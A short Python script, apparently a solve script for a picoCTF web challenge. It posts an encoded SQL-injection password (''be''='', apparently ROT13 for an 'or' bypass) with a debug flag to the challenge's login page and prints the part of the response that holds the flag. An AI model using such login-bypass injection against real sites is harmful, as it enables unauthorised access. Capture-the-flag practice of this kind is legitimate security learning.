#!/usr/bin/python3

import requests
url = 'https://jupiter.challenges.picoctf.org/problem/54253/login.php'
data = {
    'password':'\'be\'\'=\'',
    'debug':'1'
        }

p = requests.post(url, data=data)

print((p.text)[123:154])

